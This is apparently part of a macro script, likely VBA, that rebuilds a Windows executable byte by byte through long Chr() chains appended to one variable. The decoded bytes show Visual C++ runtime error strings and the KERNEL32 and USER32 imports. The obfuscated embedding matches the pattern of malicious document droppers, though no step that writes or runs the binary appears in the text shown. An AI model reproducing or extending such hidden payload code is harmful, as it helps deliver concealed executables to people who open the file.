gfoN=gfoN&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(116)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(100)&Chr(117)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)
gfoN=gfoN&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(32)&Chr(73)&Chr(116)&Chr(32)&Chr(105)&Chr(115)&Chr(32)&Chr(109)&Chr(111)&Chr(115)&Chr(116)&Chr(32)&Chr(108)&Chr(105)&Chr(107)&Chr(101)&Chr(108)&Chr(121)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(117)&Chr(108)&Chr(116)&Chr(32)&Chr(111)&Chr(102)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(112)&Chr(105)&Chr(108)&Chr(101)&Chr(100)&Chr(32)&Chr(40)&Chr(47)&Chr(99)&Chr(108)&Chr(114)&Chr(41)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(116)&Chr(114)&Chr(117)&Chr(99)
gfoN=gfoN&Chr(116)&Chr(111)&Chr(114)&Chr(32)&Chr(111)&Chr(114)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(68)&Chr(108)&Chr(108)&Chr(77)&Chr(97)&Chr(105)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(49)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)
gfoN=gfoN&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(97)&Chr(110)&Chr(32)&Chr(111)&Chr(110)&Chr(99)&Chr(101)&Chr(46)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(48)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(105)
gfoN=gfoN&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(119)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)
gfoN=gfoN&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(115)&Chr(116)&Chr(100)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(53)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(112)&Chr(117)&Chr(114)&Chr(101)&Chr(32)&Chr(118)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(13)
gfoN=gfoN&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(52)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(95)&Chr(111)&Chr(110)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(47)&Chr(97)&Chr(116)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(32)&Chr(116)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(111)&Chr(112)&Chr(101)&Chr(110)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(111)&Chr(108)&Chr(101)&Chr(32)&Chr(100)&Chr(101)&Chr(118)&Chr(105)&Chr(99)&Chr(101)&Chr(13)&Chr(10)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)
gfoN=gfoN&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(13)&Chr(10)&Chr(0)&Chr(13)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(116)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(105)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(117)
gfoN=gfoN&Chr(110)&Chr(117)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(119)&Chr(97)&Chr(121)&Chr(46)&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)
gfoN=gfoN&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(101)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(13)&Chr(10)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(97)&Chr(114)&Chr(103)&Chr(117)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(115)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(102)&Chr(108)&Chr(111)&Chr(97)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(112)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)
gfoN=gfoN&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(32)&Chr(86)&Chr(105)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(67)&Chr(43)&Chr(43)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(10)&Chr(0)&Chr(0)&Chr(46)&Chr(46)&Chr(46)&Chr(0)&Chr(60)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(117)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)&Chr(62)&Chr(0)&Chr(0)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)
gfoN=gfoN&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(33)&Chr(10)&Chr(10)&Chr(80)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(58)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(0)&Chr(0)&Chr(192)
gfoN=gfoN&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(69)&Chr(110)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(75)&Chr(0)&Chr(69)&Chr(0)&Chr(82)&Chr(0)&Chr(78)&Chr(0)&Chr(69)&Chr(0)&Chr(76)&Chr(0)&Chr(51)&Chr(0)&Chr(50)&Chr(0)&Chr(46)&Chr(0)&Chr(68)&Chr(0)&Chr(76)&Chr(0)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)
gfoN=gfoN&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)
gfoN=gfoN&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(80)&Chr(111)&Chr(112)&Chr(117)&Chr(112)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(0)&Chr(77)&Chr(101)&Chr(115)&Chr(115)&Chr(97)&Chr(103)&Chr(101)&Chr(66)&Chr(111)&Chr(120)&Chr(65)&Chr(0)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(51)&Chr(50)&Chr(46)&Chr(68)&Chr(76)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)
gfoN=gfoN&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)
gfoN=gfoN&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)
